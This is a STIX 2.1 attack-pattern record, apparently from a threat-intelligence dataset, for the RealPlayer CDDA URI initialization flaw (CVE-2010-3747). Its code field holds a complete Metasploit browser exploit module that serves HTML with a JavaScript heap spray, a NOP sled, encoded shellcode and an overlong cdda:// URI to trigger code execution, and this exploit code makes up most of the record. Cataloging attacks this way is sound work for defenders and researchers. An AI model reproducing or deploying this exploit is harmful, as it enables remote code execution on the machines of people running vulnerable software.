{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8316bd3e-031d-4fd3-8aaa-2bd4a2682d4b",
    "created": "2024-08-14T16:42:54.348968Z",
    "modified": "2024-08-14T16:42:54.348973Z",
    "name": "RealNetworks RealPlayer CDDA URI Initialization Vulnerability",
    "description": " This module exploits an initialization flaw within RealPlayer 11/11.1 and RealPlayer SP 1.0 - 1.1.4. An abnormally long CDDA URI causes an object initialization failure. However, this failure is improperly handled and uninitialized memory executed.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/realplayer_cdda_uri.rb",
            "external_id": "realplayer_cdda_uri.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3747"
        },
        {
            "source_name": "reference",
            "url": "http://service.real.com/realplayer/security/10152010_player/en/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'RealNetworks RealPlayer CDDA URI Initialization Vulnerability',\n      'Description'    => %q{\n          This module exploits an initialization flaw within RealPlayer 11/11.1 and\n        RealPlayer SP 1.0 - 1.1.4. An abnormally long CDDA URI causes an object\n        initialization failure. However, this failure is improperly handled and\n        uninitialized memory executed.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'bannedit',\n          'sinn3r'\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3747' ],\n          [ 'OSVDB', '68673'],\n          [ 'BID', '44144' ],\n          [ 'ZDI', '10-210'],\n          [ 'URL', 'http://service.real.com/realplayer/security/10152010_player/en/']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          [ 'RealPlayer SP 1.0 - 1.1.4 Universal',     { 'Ret' => 0x21212121 } ],\n          [ 'RealPlayer 11.0 - 11.1 Universal',        { 'Ret' => 0x21212121 } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2010-11-15',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    mytarget = target\n\n    # the ret slide gets executed via call [esi+45b]\n    retslide = [mytarget.ret].pack('V') * 750\n    cdda_uri = \"cdda://\" +  retslide\n\n    # Encode the shellcode\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n    nops = make_nops(8)\n    nop_sled = Rex::Text.to_unescape(nops, Rex::Arch.endian(target.arch))\n\n    # Randomize Javascript variables\n    var_blocks    = rand_text_alpha(rand(6)+3)\n    var_shellcode = rand_text_alpha(rand(6)+3)\n    var_index     = rand_text_alpha(rand(6)+3)\n    var_nopsled   = rand_text_alpha(rand(6)+3)\n    spray_func    = rand_text_alpha(rand(6)+3)\n    obj_id        = rand_text_alpha(rand(6)+3)\n    randnop       = rand_text_alpha(rand(100) + 1)\n    html = <<-EOS\n<html>\n<head>\n<script>\nfunction #{spray_func}() {\n  #{var_blocks} = new Array();\n  var #{var_shellcode} = unescape(\"#{shellcode}\");\n  var #{randnop} = \"#{nop_sled}\";\n  var #{var_nopsled} = unescape(#{randnop});\n  do { #{var_nopsled} += #{var_nopsled} } while (#{var_nopsled}.length < 8200);\n    for (#{var_index}=0; #{var_index} < 19000; #{var_index}++)\n      #{var_blocks}[#{var_index}] = #{var_nopsled} + #{var_shellcode};\n  }\n#{spray_func}();\n</script>\n</head>\n<object id=#{obj_id} classid='clsid:CFCDAA03-8BE4-11CF-B84B-0020AFBBCCFA' width=0 height=0>\n<param name=\"CONTROLS\" value=\"ControlPanel\">\n<param name=\"src\" value=\"#{cdda_uri}\">\n</object>\n<script language=\"VBScript\">\n#{obj_id}.DoPlay\n</script>\n</html>\nEOS\n    print_status(\"Sending #{self.name} HTML\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-11-15",
    "x_mitre_platforms": [
        "win'"
    ]
}